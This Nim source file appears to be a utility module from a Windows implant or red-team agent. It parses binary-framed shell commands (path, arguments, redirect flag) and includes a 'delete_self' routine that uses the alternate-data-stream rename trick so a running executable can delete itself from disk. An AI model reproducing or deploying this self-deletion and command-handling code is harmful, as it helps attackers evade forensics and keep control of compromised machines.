import std/[os, strutils, macros, unicode, endians]
import winim

proc toString*(str: seq[byte]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, ch.char)

proc toSeq*(s: string): seq[byte] =
  for c in s:
    result.add(c.byte)

proc toSeq*(ws: wstring): seq[byte] =
  for wc in ws:
    result.add(byte(wc shr 8))
    result.add(byte(wc and 0xff))

template dbg*(msg: string) =
  when not defined(release):
    echo msg

# usage: importAll('cmd', '.nim')
macro importAll*(folder, ext: static string) =
  result = newStmtList()
  for file in walkDir(folder, checkDir=true):
    if file.path.endsWith(ext):
      result.add nnkImportStmt.newTree(
        newIdentNode(file.path[0 ..< ^ext.len])
      )

var codepage_ansi*: int32

proc codepage_to_utf8_native*(data: seq[byte]): seq[byte] =
  var sdata = data.toString
  if validateUtf8(sdata) == -1: return 
  var num_of_bytes = MultiByteToWideChar(codepage_ansi, MB_PRECOMPOSED, &sdata, data.len.int32, nil, 0.int32)
  if num_of_bytes == 0: return
  var wsres = newWString(num_of_bytes)
  if MultiByteToWideChar(codepage_ansi, MB_PRECOMPOSED, &sdata, data.len.int32, &wsres, num_of_bytes) == 0: return
  return wsres.toSeq

proc parse_arg_once(data: var seq[byte]): (seq[byte], bool) =
  if data.len < 4: return
  var arg_len: int32 = 0
  var arg_len_bytes = data[0..<4]
  bigEndian32(addr arg_len, addr arg_len_bytes)
  if arg_len == 0: return (newSeq[byte](), false)

  var arg = data[4..<4+arg_len]
  data = data[4+arg_len..^1]
  return (arg, true)

type parse_command_result* = tuple
  path: string
  args: string
  redirect: uint16
  msg: string

proc parse_command_shell*(data: var seq[byte]): parse_command_result =
  var path, args: seq[byte]
  var ok: bool
  (path, ok) = parse_arg_once(data)
  if not ok: 
    result.msg = "parse path failed"
    return
  (args, ok) = parse_arg_once(data)
  if not ok: 
    result.msg = "parse args failed"
    return
  
  var redirect: uint16
  var redirect_bytes = data[0 ..< 2]
  bigEndian16(redirect.addr, redirect_bytes.addr)

  result.path = path.toString
  result.args = args.toString
  result.redirect = redirect
  result.msg = ""
  return

proc delete_self*() =
    var wcPath: array[MAX_PATH+1, WCHAR]
    var hCurrent: HANDLE
    RtlSecureZeroMemory(wcPath[0].addr, sizeof(wcPath))
    if GetModuleFileNameW(0, wcPath[0].addr, MAX_PATH) == 0: 
        dbg "[-] failed to get self path"
        return
    hCurrent = CreateFileW(wcPath[0].addr, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    if hCurrent == INVALID_HANDLE_VALUE: 
        dbg "[-] failed to open self handle"
        return
    dbg "[+] try to delete self"

    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(fRename.addr, sizeof(fRename))
    var DS_STREAM_RENAME = newWideCString(":wtfbbq")
    var lpwStream: LPWSTR = DS_STREAM_RENAME
    fRename.FileNameLength = sizeof(lpwStream).DWORD
    RtlCopyMemory(fRename.FileName.addr, lpwStream, sizeof(lpwStream))
    if SetFileInformationByHandle(hCurrent, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream)) == 0:
        dbg "[-] failed to rename to stream"
        return

    dbg "[+] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle"
    CloseHandle(hCurrent)

    hCurrent = CreateFileW(wcPath[0].addr, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    if hCurrent == INVALID_HANDLE_VALUE: 
        dbg "[-] failed to reopen self handle"
        return
    
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(fDelete.addr, sizeof(fDelete))
    fDelete.DeleteFile = TRUE
    if SetFileInformationByHandle(hCurrent, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint) == 0:
        dbg "[-] failed to set delete deposition"
        return

    dbg "[+] Successfully set delete deposition, closing initial handle to trigger delete"
    CloseHandle(hCurrent)

    if not PathFileExistsW(wcPath[0].addr).bool:
        dbg "[+] Successfully deleted self"